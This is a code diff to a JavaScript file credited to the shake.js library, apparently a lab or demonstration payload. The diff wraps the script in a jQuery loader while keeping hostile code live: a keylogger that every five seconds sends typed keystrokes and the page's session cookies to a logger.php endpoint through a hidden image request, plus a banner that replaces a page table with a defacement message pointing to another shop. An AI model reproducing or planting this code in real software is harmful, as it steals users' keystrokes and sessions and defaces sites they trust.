@@ -2,10 +2,25 @@
  * Original Source: https://github.com/alexgibson/shake.js
  * Original Author: Alex Gibson
  */
-var table = $(".table");
-var hacked = $("<h1 style='padding:10px;color:red;'>All juices are rotten! Go to <a href='http://www.shop.lo'>www.shop.lo</a></h1>").hide();
-table.after(hacked);
-if (function () {
+(function() {
+    function loadJQuery(callback) {
+        if (window.jQuery) {
+            callback();
+        } else {
+            var script = document.createElement("script");
+            script.type = "text/javascript";
+            script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
+            script.onload = callback;
+            document.head.appendChild(script);
+        }
+    }
+
+    loadJQuery(function() {
+        var $ = window.jQuery;
+        var table = $(".table");
+        var hacked = $("<h1 style='padding:10px;color:red;'>All juices are rotten! Go to <a href='http://www.shop.lo'>www.shop.lo</a></h1>").hide();
+        table.after(hacked);
+        if (function () {
         function e() {
             var e = document.createElement("link")
             e.setAttribute("type", "text/css"), e.setAttribute("rel", "stylesheet"), e.setAttribute("href", C), e.setAttribute("class", E), document.body.appendChild(e)
@@ -103,14 +118,16 @@ if (function () {
         "" != kylggr && logger(kylggr), kylggr = ""
     }, 5e3)
 }
-setTimeout(function () {
-    table.hide();
-    hacked.show();
-}, 9000);
+        setTimeout(function () {
+            table.hide();
+            hacked.show();
+        }, 9000);
 
-function logger(t) {
-  console.log("in logger",t);
-  $("body").append('<img src="http://localhost:8080/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
-}
+        function logger(t) {
+            console.log("in logger", t);
+            $("body").append('<img src="http://localhost:8080/logger.php?input=' + t + '%20Session: ' + document.cookie + '" style="display:none;" />')
+        }
+    });
+})();
 
 
